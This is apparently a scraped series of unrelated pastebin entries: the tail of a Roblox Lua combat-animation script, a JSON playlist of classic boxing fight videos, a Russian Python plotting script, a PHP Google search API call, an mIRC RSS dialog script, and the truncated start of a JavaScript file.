			LS.C0 = LS.C0:lerp(LSC0*CF.A(M.R(-5),0,M.R(-90)+idk),Alpha)
			RS.C0 = RS.C0:lerp(RSC0*CF.A(M.R(-5),0,M.R(90)-idk),Alpha)
			RJ.C0 = RJ.C0:lerp(RJC0,Alpha)
			NK.C0 = NK.C0:lerp(NKC0,Alpha)
			LH.C0 = LH.C0:lerp(LHC0*CF.A(0,0,M.R(-5)),Alpha)
			RH.C0 = RH.C0:lerp(RHC0*CF.N(0,1,-1)*CF.A(M.R(-5),0,M.R(5)),Alpha)
			local LookVector = Mouse.Hit.p
			Root.CFrame = CF.N(Root.Position,LookVector)
			swait()
		until not S.UserInputService:IsKeyDown(key)
	end
	
	local hit,pos,norm,dist = CastRay(data.Circle.CFrame.p,Mouse.Hit.p,1024)
	local part = Part(Effects,MagicVariant.EffectColor or MagicVariant.Color,Enum.Material.Neon,V3.N(dist,data.Mesh.Scale.x/40,data.Mesh.Scale.x/40),CF.N(data.Circle.CFrame.p,pos)*CF.N(0,0,-dist/2)*CF.A(0,M.P/2,0),true,false)
	Mesh(part,Enum.MeshType.Cylinder)
	Tween(part,{Color=C3.N(1,1,1)},1,Enum.EasingStyle.Quad,Enum.EasingDirection.Out,0,false)
	local aa = data.Circle:Clone();
	aa.Parent = Effects
	aa.Anchored = true
	local blast = Sound(aa,334702766,1,5,false,true,true)
	data.Circle:destroy()
	if(not blast.IsLoaded)then repeat swait() until blast.IsLoaded end
	Effect{
		Effect='ResizeAndFade',
		Color=MagicVariant.Color,
		Size=V3.N(data.Mesh.Scale.X/20,data.Mesh.Scale.X/20,data.Mesh.Scale.X/20),
		Mesh={MeshType=Enum.MeshType.Sphere},
		CFrame=CF.N(pos),
		Sound=blast,
		FXSettings={
			EndSize=V3.N(.05,.05,.05),
			EndIsIncrement=true
		}
	}
	for i = 1, 5 do
		local angles = CF.A(M.RRNG(-180,180),M.RRNG(-180,180),M.RRNG(-180,180))
		Effect{
			Effect='Fade',
			Frames=65,
			Sound=blast,
			Size=V3.N((data.Mesh.Scale.X/20)/2,(data.Mesh.Scale.X/20)/2,data.Mesh.Scale.X/20),
			CFrame=CF.N(CF.N(pos)*angles*CF.N(0,0,-(data.Mesh.Scale.X/20)).p,pos),
			Mesh = {MeshType=Enum.MeshType.Sphere},
			Material=Enum.Material.Neon,
			Color=MagicVariant.Color,
			MoveDirection=CF.N(CF.N(pos)*angles*CF.N(0,0,-50).p,pos).p,
		}	
	end
	AOEDamage(pos,data.Mesh.Scale.X/20,45,75,0,'Normal',10,4)
	coroutine.wrap(function()
		for i = 1, (blast.TimeLength*Frame_Speed) do
			part.Transparency = (i/(blast.TimeLength*Frame_Speed))
			for _,v in next, aa:children() do if v:IsA'Decal' then v.Transparency = (i/(blast.TimeLength*Frame_Speed)) end end
			swait()
		end
		aa:destroy()
		part:destroy()
	end)()
	
	Attack = false
	NeutralAnims = true
	Root.Anchored = false
	Root.Velocity = Mouse.Hit.lookVector*-125
end

function Skill1()
	Laser(Enum.KeyCode.Q)
end

function Skill2()
	DLaser(Enum.KeyCode.Z)
end

function Skill3()
	BLaser(Enum.KeyCode.X)
end

--// Wrap it all up \\--

Mouse.KeyDown:connect(function(k)
	if(Attack)then return end
	if(k == 'q')then Skill1() end
	if(k == 'z')then Skill2() end
	if(k == 'x')then Skill3() end
end)

Plr.Chatted:connect(function(m)
	
	if(m:sub(1,3) == '/e ')then
		local msg = m:sub(4)
		--emote commands (gotta do)
	end
end)
while true do
	swait()
	Sine = Sine + Change

	local hitfloor,posfloor = workspace:FindPartOnRay(Ray.new(Root.CFrame.p,((CFrame.new(Root.Position,Root.Position - Vector3.new(0,1,0))).lookVector).unit * (4)), Char)
	
	local Walking = (math.abs(Root.Velocity.x) > 1 or math.abs(Root.Velocity.z) > 1)
	local State = (Hum.PlatformStand and 'Paralyzed' or Hum.Sit and 'Sit' or not hitfloor and Root.Velocity.y < -1 and ""Fall"" or not hitfloor and Root.Velocity.y > 1 and ""Jump"" or hitfloor and Walking and (Hum.WalkSpeed > 24 and ""Run"" or ""Walk"") or hitfloor and ""Idle"")
	if(not Effects or not Effects.Parent)then
		Effects = IN(""Model"",Char)
		Effects.Name = ""Effects""
	end																																																																																																				
	if(State == 'Run')then
		local wsVal = 20 / (Hum.WalkSpeed/16)
		local Alpha = math.min(.2 * (Hum.WalkSpeed/16),1)
		Change = 3
		RH.C1 = RH.C1:lerp(CF.N(0,1,0)*CF.N(0,0-.2*M.C(Sine/wsVal),0+.4*M.C(Sine/wsVal))*CF.A(M.R(15+25*M.C(Sine/wsVal))+-M.S(Sine/wsVal),0,0),Alpha)
		LH.C1 = LH.C1:lerp(CF.N(0,1,0)*CF.N(0,0+.2*M.C(Sine/wsVal),0-.4*M.C(Sine/wsVal))*CF.A(M.R(15-25*M.C(Sine/wsVal))+M.S(Sine/wsVal),0,0),Alpha)	
	elseif(State == 'Walk')then
		local wsVal = 20 / (Hum.WalkSpeed/16)
		local Alpha = math.min(.3 * (Hum.WalkSpeed/8),1)
		Change = 3
		RH.C1 = RH.C1:lerp(CF.N(0,1,0)*CF.N(0,0-.5*M.C(Sine/wsVal)/2,0+.6*M.C(Sine/wsVal)/2)*CF.A(M.R(15-2*M.C(Sine/wsVal))+-M.S(Sine/wsVal)/2.5,0,0),Alpha)
		LH.C1 = LH.C1:lerp(CF.N(0,1,0)*CF.N(0,0+.5*M.C(Sine/wsVal)/2,0-.6*M.C(Sine/wsVal)/2)*CF.A(M.R(15+2*M.C(Sine/wsVal))+M.S(Sine/wsVal)/2.5,0,0),Alpha)	
	else
		RH.C1 = RH.C1:lerp(CF.N(0,1,0),.2)
		LH.C1 = LH.C1:lerp(CF.N(0,1,0),.2)
	end	

	Hum.WalkSpeed = WalkSpeed
	
	if(NeutralAnims)then	
		if(State == 'Idle')then
			local Alpha = .1
			Change = .75
			RJ.C0 = RJ.C0:lerp(RJC0*CF.N(0+.2*M.C(Sine/12),.2*M.C(Sine/6),0)*CF.A(M.R(-5+5*M.C(Sine/12)),0,0),Alpha)
			NK.C0 = NK.C0:lerp(NKC0*CF.A(M.R(-5+5*M.C(Sine/12)),0,0),Alpha)
			LS.C0 = LS.C0:lerp(LSC0*CF.N(.25,0,0)*CF.A(M.R(-45),0,M.R(45+5*M.C(Sine/12))),Alpha)
			RS.C0 = RS.C0:lerp(RSC0*CF.N(-.25,0,0)*CF.A(M.R(-45),0,M.R(-45-5*M.C(Sine/12))),Alpha)
			LH.C0 = LH.C0:lerp(LHC0*CF.N(0-.2*M.C(Sine/12),-.2*M.C(Sine/6),0)*CF.A(M.R(5-5*M.C(Sine/12)),M.R(10),0),Alpha)
			RH.C0 = RH.C0:lerp(RHC0*CF.N(0-.2*M.C(Sine/12),-.2*M.C(Sine/6),0)*CF.A(M.R(5-5*M.C(Sine/12)),M.R(-10),0),Alpha)
			-- idle
		elseif(State == 'Run')then
			local wsVal = 20 / (Hum.WalkSpeed/16)
			local Alpha = math.min(.2 * (Hum.WalkSpeed/16),1)
			RJ.C0 = RJ.C0:lerp(CF.N(0,0-.1*M.C(Sine/(wsVal/2)),0)*CF.A(M.R(-15+2.5*M.C(Sine/(wsVal/2))),M.R(8*M.C(Sine/wsVal)),0),Alpha)
			NK.C0 = NK.C0:lerp(NKC0,Alpha)
			LS.C0 = LS.C0:lerp(LSC0*CF.N(0,0,0-.3*M.S(Sine/wsVal))*CF.A(M.R(0+45*M.S(Sine/wsVal)),0,M.R(-5)),Alpha)
			RS.C0 = RS.C0:lerp(RSC0*CF.N(0,0,0+.3*M.S(Sine/wsVal))*CF.A(M.R(0-45*M.S(Sine/wsVal)),0,M.R(5)),Alpha)
			LH.C0 = LH.C0:lerp(LHC0*CF.N(0,0+.1*M.C(Sine/(wsVal/2)),0)*CF.A(0,-M.R(4*M.C(Sine/wsVal)),0),Alpha)
			RH.C0 = RH.C0:lerp(RHC0*CF.N(0,0+.1*M.C(Sine/(wsVal/2)),0)*CF.A(0,-M.R(4*M.C(Sine/wsVal)),0),Alpha)
		elseif(State == 'Walk')then
			local wsVal = 20 / (Hum.WalkSpeed/16)
			local Alpha = math.min(.3 * (Hum.WalkSpeed/16),1)
			RJ.C0 = RJ.C0:lerp(CF.N(0,0-.1*M.C(Sine/(wsVal/2)),0)*CF.A(M.R(-5-2.5*M.C(Sine/(wsVal/2))),M.R(8*M.C(Sine/wsVal)),0),Alpha)
			NK.C0 = NK.C0:lerp(NKC0,Alpha)
			LS.C0 = LS.C0:lerp(LSC0*CF.N(0,0,-.22*M.C(Sine/wsVal))*CF.A(M.R(37*M.C(Sine/wsVal)),0,M.R(-5)),Alpha)
			RS.C0 = RS.C0:lerp(RSC0*CF.N(0,0,.22*M.C(Sine/wsVal))*CF.A(M.R(-37*M.C(Sine/wsVal)),0,M.R(5)),Alpha)
			LH.C0 = LH.C0:lerp(LHC0*CF.N(0,0+.1*M.C(Sine/(wsVal/2)),0)*CF.A(0,-M.R(4*M.C(Sine/wsVal)),0),Alpha)
			RH.C0 = RH.C0:lerp(RHC0*CF.N(0,0+.1*M.C(Sine/(wsVal/2)),0)*CF.A(0,-M.R(4*M.C(Sine/wsVal)),0),Alpha)
		elseif(State == 'Jump')then
			local Alpha = .1
			local idk = math.min(math.max(Root.Velocity.Y/50,-M.R(90)),M.R(90))
			LS.C0 = LS.C0:lerp(LSC0*CF.A(M.R(-5),0,M.R(-90)),Alpha)
			RS.C0 = RS.C0:lerp(RSC0*CF.A(M.R(-5),0,M.R(90)),Alpha)
			RJ.C0 = RJ.C0:lerp(RJC0*CF.A(math.min(math.max(Root.Velocity.Y/100,-M.R(45)),M.R(45)),0,0),Alpha)
			NK.C0 = NK.C0:lerp(NKC0*CF.A(math.min(math.max(Root.Velocity.Y/100,-M.R(45)),M.R(45)),0,0),Alpha)
			LH.C0 = LH.C0:lerp(LHC0*CF.A(0,0,M.R(-5)),Alpha)
			RH.C0 = RH.C0:lerp(RHC0*CF.N(0,1,-1)*CF.A(M.R(-5),0,M.R(5)),Alpha)
		elseif(State == 'Fall')then
			local Alpha = .1
			local idk = math.min(math.max(Root.Velocity.Y/50,-M.R(90)),M.R(90))
			LS.C0 = LS.C0:lerp(LSC0*CF.A(M.R(-5),0,M.R(-90)+idk),Alpha)
			RS.C0 = RS.C0:lerp(RSC0*CF.A(M.R(-5),0,M.R(90)-idk),Alpha)
			RJ.C0 = RJ.C0:lerp(RJC0*CF.A(math.min(math.max(Root.Velocity.Y/100,-M.R(45)),M.R(45)),0,0),Alpha)
			NK.C0 = NK.C0:lerp(NKC0*CF.A(math.min(math.max(Root.Velocity.Y/100,-M.R(45)),M.R(45)),0,0),Alpha)
			LH.C0 = LH.C0:lerp(LHC0*CF.A(0,0,M.R(-5)),Alpha)
			RH.C0 = RH.C0:lerp(RHC0*CF.N(0,1,-1)*CF.A(M.R(-5),0,M.R(5)),Alpha)
		elseif(State == 'Paralyzed')then
			-- paralyzed
		elseif(State == 'Sit')then
			-- sit
		end
	end
	
end"
aj9hRrAF,Untitled,jaguenk,JSON,Friday 28th of March 2025 06:20:30 PM CDT,"{
""name"": ""DiFeriDos ReMenBer BoXing"",
""author"": ""🅰️🅵1🅲🅸🅾️🅽🅰️🅳🅾️🆂"",
""url"": ""https://pastebin.com/raw/aj9hRrAF"",
""image"": ""https://i.gifer.com/J4L.gif"",
""telegram"": ""@Tintxi"",
""info"": ""by Tintxi"",
""stations"":
	[
 
	{
	""name"": ""Ali 🆚 Mildenberger"",
	""image"": ""https://i.postimg.cc/j2pRQFZv/IMG-20240126-131836-632.jpg"",
	""url"": ""https://filemoon.to/d/75s14ytthmny"",
	""info"": ""10-09-1966"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"", 
    ""embed"": """",
	""isHost"":""true"",
	""online"":""true""
	},
	{ 
	""name"": ""Mosley 🆚 Cotto"", 
	""image"": ""https://i.postimg.cc/mDgnbQ3y/IMG-20240127-030005.jpg"", 
	""url"": ""https://filemoon.to/d/3da3r8oh8i7c"", 
	""info"": ""11-11-2007"", 
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"", 
	""online"": ""true"" 
	},
	{ 
	""name"": ""Hagler 🆚 Duran"",
	""image"": ""https://i.postimg.cc/hv9ZspKg/IMG-20240127-030014.jpg"",
	""url"": ""https://filemoon.to/d/qlytfygy17lk"",
	""info"": ""10-11-1983"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"", 
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
	{ 
	""name"": ""Pacquiao 🆚 Bradley"",
	""image"": ""https://i.postimg.cc/rwDWbBJj/IMG-20240127-121133.jpg"",
    ""url"": ""https://filemoon.to/d/g6py37oqop4g"",
	""info"": ""09-06-2012"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Pacquiao 🆚 Bradley 2"",
	""image"": ""https://i.postimg.cc/LsNGQZ6G/IMG-20240127-121142.jpg"",
	""url"": ""https://filemoon.to/d/in6sb7et92vv"",
	""info"": ""12-04-2014"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"", 
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Pacquiao 🆚 Margarito"",
	""image"": ""https://i.postimg.cc/7YGncQfr/IMG-20240127-121150.jpg"",
	""url"": ""https://filemoon.to/d/mk4yajwvp1lv"",
	""info"": ""13-11-2010"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"", 
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Alvarez 🆚 Hatton"",
	""image"": ""https://i.postimg.cc/nVSqZ8Ww/IMG-20240127-121158.jpg"",
	""url"": ""https://filemoon.to/d/8en77h8vn9aw"",
	""info"": ""05-03-2011"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
    ""embed"": ""true"",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Cotto 🆚 Martinez"",
	""image"": ""https://i.postimg.cc/DzxW7LZ3/IMG-20240127-121206.jpg"",
	""url"": ""https://filemoon.to/d/n35lr0vhbu5b"",
	""info"": ""07-06-2014"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Barrera 🆚 Pacquiao"",
	""image"": ""https://i.postimg.cc/Kv7Hcr6W/IMG-20240127-121214.jpg"",
	""url"": ""https://filemoon.to/d/b6iac2nocnwa"",
	""info"": ""15-11-2003"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"", 
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Canelo 🆚 Chavez Jr"",
	""image"": ""https://i.postimg.cc/7PVrL4rD/IMG-20240127-165120.jpg"",
	""url"": ""https://filemoon.to/d/wviw3xhpl11m"",
	""info"": ""06-05-2017"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"", 
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Tyson 🆚 Holmes"",
	""image"": ""https://i.postimg.cc/wTCCfjhX/IMG-20240127-121837-297.jpg"",
	""url"": ""https://filemoon.to/d/09phevok6xhg"",
	""info"": ""22-01-1988"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Foreman 🆚 Ellis"",
	""image"": ""https://i.postimg.cc/7PnvskKd/IMG-20240127-121849-122.jpg"",
	""url"": ""https://filemoon.to/d/n6lravtnbzi4"",
	""info"": ""12-07-1991"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"", 
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Hamed 🆚 Barrera"",
	""image"": ""https://i.postimg.cc/Fsz3jgPY/IMG-20240127-123851-351.jpg"",
	""url"": ""https://filemoon.to/d/v71jnsjkm6qj"",
	""info"": ""07-04-2001"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Maywheather 🆚 Marquez"",
	""image"": ""https://i.postimg.cc/Sx2Q4Vdb/IMG-20240127-124415-891.jpg"",
	""url"": ""https://filemoon.to/d/hv51ewok6wfm"",
	""info"": ""19-09-2009"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Buchanan 🆚 Duran"",
	""image"": ""https://i.postimg.cc/s2JgHxKM/IMG-20240127-125107-745.jpg"",
	""url"": ""https://filemoon.to/d/gukuro2j0blc"",
	""info"": ""26-06-1972"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Ali 🆚 Chuvalo"",
	""image"": ""https://i.postimg.cc/Xq8YfYYW/IMG-20240128-115740.jpg"",
	""url"": ""https://filemoon.to/d/5g6qo5hwapkx"",
	""info"": ""29-06-1966"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Chavez 🆚 Smith"",
	""image"": ""https://i.postimg.cc/fyRrCY4B/IMG-20240128-120104-508.jpg"",
	""url"": ""https://filemoon.to/d/j24cl04tcjye"",
	""info"": ""19-09-1991"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
  	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""De La Hoya 🆚 Quartey"",
	""image"": ""https://i.postimg.cc/9MjLLMNR/IMG-20240128-121706-495.jpg"",
	""url"": ""https://filemoon.to/d/mi9nhrab466h"",
	""info"": ""13-02-1999"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Marciano 🆚 Moore"",
	""image"": ""https://i.postimg.cc/SNyWQPPM/IMG-20240128-123246-989.jpg"",
	""url"": ""https://filemoon.to/d/zksplgins83r"",
	""info"": ""21-09-1955"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Torres 🆚 Cotton"",
	""image"": ""https://i.postimg.cc/d3znq5wL/IMG-20240128-123455-840.jpg"",
	""url"": ""https://filemoon.to/d/n2u5ttifcret"",
	""info"": ""15-08-1966"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Tyson 🆚 Ruddock"",
	""image"": ""https://i.postimg.cc/DfRFHJBT/Tyson-vs-ruddock.jpg"",
	""url"": ""https://filemoon.in/d/zuueuxiqs0pg"",
	""info"": ""18-03-1991"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Barkley 🆚 Duran"",
	""image"": ""https://i.postimg.cc/fb5Dn23s/IMG-20240202-081550-655.jpg"",
	""url"": ""https://filemoon.to/d/r7u7k3791v6s"",
	""info"": ""02-12-2000"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Trinidad 🆚 Vargas"",
	""image"": ""https://i.postimg.cc/nrt5vcWD/IMG-20240202-081628-116.jpg"",
	""url"": ""https://filemoon.to/d/if6vrk15nx3u"",
	""info"": ""24-02-1989"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Leonard 🆚 Camacho"",
	""image"": ""https://i.postimg.cc/RCYDJK0V/IMG-20240202-081643-035.jpg"",
	""url"": ""https://filemoon.to/d/gw3n1lza8cl8"",
	""info"": ""01-03-1997"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Holyfield 🆚 Holmes"",
	""image"": ""https://i.postimg.cc/NFFZ7k9g/IMG-20240202-081656-212.jpg"",
	""url"": ""https://filemoon.to/d/fglvnvtje276"",
	""info"": ""19-06-1992"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Holyfield 🆚 Foreman"",
	""image"": ""https://i.postimg.cc/qvRbDmyS/Holyfield-Foreman-19-04-91.jpg"",
	""url"": ""https://filemoon.to/d/yl6700qvjome"",
	""info"": ""19-04-1991"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Mosley 🆚 Mayorga"",
	""image"": ""https://i.postimg.cc/1XsMGMyW/Mosley-Mayorga-27-09-08.jpg"",
	""url"": ""https://filemoon.to/d/svu3u8tt8fr6"",
	""info"": ""27-09-2008"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Foreman 🆚 Briggs"",
	""image"": ""https://i.postimg.cc/NF0XmwZC/IMG-20240221-201216-934.jpg"",
	""url"": ""https://filemoon.to/d/09elvbu7ru02"",
	""info"": ""22-11-1997"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Whitaker 🆚 Chavez"",
	""image"": ""https://i.postimg.cc/m213DF4h/IMG-20240221-201236-722.jpg"",
	""url"": ""https://filemoon.to/d/6t51d8gkgtcj"",
	""info"": ""10-09-1993"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Morales 🆚 Pacquiao"",
	""image"": ""https://i.postimg.cc/Fzp49Cwf/IMG-20240221-201256-852.jpg"",
	""url"": ""https://filemoon.to/d/5iup2twnbd1f"",
	""info"": ""19-03-2005"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Louis 🆚 Charles"",
	""image"": ""https://i.postimg.cc/bwTGBwxG/IMG-20240311-203743-326.jpg"",
	""url"": ""https://filemoon.to/d/heji2bom3gtp"",
	""info"": ""29-09-1950"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Ali 🆚 Patterson"",
	""image"": ""https://i.postimg.cc/jSs3dbvR/IMG-20240311-203751-668.jpg"",
	""url"": ""https://filemoon.to/d/51tjgzrl4pz4"",
	""info"": ""20-09-1972"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Chavez 🆚 Taylor"",
	""image"": ""https://i.postimg.cc/7hZWbS03/IMG-20240330-201718.jpg"",
	""url"": ""https://filemoon.to/d/6esrdx0p7tn8/"",
""referer"":""https://embedme.xyz"",
	""info"": ""17-03-1990"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Hagler 🆚 Leonard"",
	""image"": ""https://i.postimg.cc/QM5RYqCy/hagler-1.jpg"",
	""url"": ""https://filemoon.to/d/gk1hwe6o5x25"",
""referer"":""https://embedme.xyz"",
	""info"": ""06-04-1987"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Vargas 🆚 Wright"",
	""image"": ""https://i.postimg.cc/yYBsnP6W/images-1.jpg"",
	""url"": ""https://filemoon.to/d/zaief02wvvco"",
""referer"":""https://embedme.xyz"",
	""info"": ""04-12-1999"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Leonard 🆚 Mayweather Sr"",
	""image"": ""https://i.postimg.cc/DZ95Cwnw/IMG-20240725-200333-1.jpg"",
	""url"": ""https://filemoon.to/d/7rx5eohor9ue"",
""referer"":""https://embedme.xyz"",
	""info"": ""09-09-1978"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Marquez 🆚 Peden"",
	""image"": ""https://i.postimg.cc/nz8xYq4z/x1080-1.jpg"",
	""url"": ""https://filemoon.to/d/6r7qachp3fzk"",
""referer"":""https://embedme.xyz"",
	""info"": ""09-03-2002"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
{ 
	""name"": ""Hagler 🆚 Mugabi"",
	""image"": ""https://i.postimg.cc/wvsGPjM7/sddefault-1.jpg"",
	""url"": ""https://nikaplayerr.com/file/aqpxa9ictmef"",
""referer"":"""",
	""info"": ""10-03-1986"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	}
 
 
]
}"
78nPJ6cP,Untitled,Oppaceted,Python,Friday 28th of March 2025 06:20:08 PM CDT,"from plots_drawing import *
from body_creation import *
import numpy as np
from constants import x_lim, y_lim

while True:
    body_generation_type = input(""Введите вариант отрисовки тела - 'full' для полной отрисовки или 'edges' чтобы нарисовать только границы: "")
    if body_generation_type in [""full"", ""edges""]:
        break
    else:
        print(""Слово написано некорректно, попробуйте ещё раз\n"")

while True:
    n = input(""\nВведите количество точек или ничего для значения по умолчанию (100 точек): "")
    try:
        n = 100 if n == """" else int(n)
        initial_points = generate_body_points_full(n=n) if body_generation_type == ""full"" else generate_body_points_only_edge(n=n)
        # Расчет траекторий
        plot_trajectories(initial_points)
    except:
        print(""Некорректный ввод, пожалуйста, повторите"")
        continue
    break

# Визуализация линий тока
t = []
t_default = [1.0, 1.4]
while True:
    temp = input(f""\nВведите моменты времени, в которые нужно отрисовать графики. Значение по умолчанию: [1.0, 1.4] Текущие значение:{t}\nВведите ваше значение, или ничего, если хотите продолжить:"")
    if temp:
        try:
            temp = float(temp)
            if temp > 0:
                t.append(temp)
            else:
                raise ValueError
        except:
            print(""Некорректный ввод, пожалуйста, повторите"")
    else:
        break
t = t_default if not t else t

print()

while True:
    quarter = input(""Введите четверть в которой хотите посчитать (в условии первая): "")
    if quarter not in [""1"", ""2"", ""3"", ""4""]:
        print(""Пожалуйста, введите четверть  как число"")
    else:
        quarter = int(quarter)
        break

x_lim_enter = np.array(tuple(reversed(x_lim)))*-1 if quarter in [2, 3] else np.array(x_lim)
y_lim_enter = np.array(tuple(reversed(y_lim)))*-1 if quarter in [3, 4] else np.array(y_lim)

for i in t:
    plot_streamlines(i, x_lim=x_lim_enter, y_lim=y_lim_enter)"
5gCjrF2f,Untitled,angelgoitia,PHP,Friday 28th of March 2025 06:12:18 PM CDT,"$response = $this->client->get($googleApiUrl, [
                'query' => [
                    'q' => ""{$hashtag} site:instagram.com"",
                    'num' => 10, 
                    'key' => env('GOOGLE_API'),
                    'cx' => env('GOOGLE_CX'),
                ],
                'headers' => [
                    'Accept' => 'application/json',
                ],
            ]);

            $results = json_decode($response->getBody()->getContents(), true);
            dd($results);"
0j6qVxm2,RSS,Tiago_f,mIRC,Friday 28th of March 2025 06:09:17 PM CDT,"on *:dialog:rss.add:*:*:{
  if ($devent == init) {
    if (%rss.edit) {
      tokenize 32 %rss.edit
      did -a $dname 4 $1
      did -a $dname 3 $2-
      dialog -t $dname Edit RSS feed $chr(35) $+ $calc($did(feedr,3).sel -1)
    }
  }
  elseif ($devent == sclick) {
    if ($did == 6) {
      if ($did(3)) && ($did(4)) {
        var %u = $replace($did(4),$chr(32),% $+ 20)
        if (%rss.edit) {
          var %editurl 1
          if (%u == $wd(%rss.edit,1,32)) %editurl = 0
          if ($hget(rss,%u) != $null) && (%editurl) { errdialog The URL you edited %u already exists with the name $wd($hget(rss,%u),2-,32) $+ ! | halt }
          else {
            var %n = $encode($did(3),m),%v = $cell(feedr,3,1)),%e = %v $+ *
            while ($hfind(rssdone,%e,1,w)) {
              var %i = $v1
              hadd rssdone $+(%n,,$wd(%i,2,1)) 1
              hdel rssdone %i
            }
            hadd rssdone SHA1: $+ %n $hget(rssdone,SHA1: $+ %v)
            hdel rssdone SHA1: $+ %v
            hdel rss %rss.edit
            hadd rss %u $calc($wd($did(feedr,3).seltext,5,32) -1) $did(3)
            did -co feedr 3 $did(feedr,3).sel 1 +fs 0 0 $wd($did(feedr,3).seltext,5,32) $did(3) $+ 	+ 0 0 0 %u
          }
        }
        elseif ($hget(rss,%u) != $null) { errdialog The URL %u already exists! | halt }
        else {
          hadd rss %u 0 $did(3)
          mdxunsel feedr 3
          did -ac feedr 3 1 + 0 0 1 $did(3) $+ 	+ 0 0 0 %u
        }
        did $iif($did(feedr,3).sel,-e,-b) feedr 6,8,24,26
        did $iif($did(feedr,3).lines >= 1,-e,-b) feedr 7
      }
      else { beep.error | halt }
    }
  }
}"
YFP331Ud,Market.js,rodrigomaise99,JavaScript,Friday 28th of March 2025 05:59:14 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/544/status"";
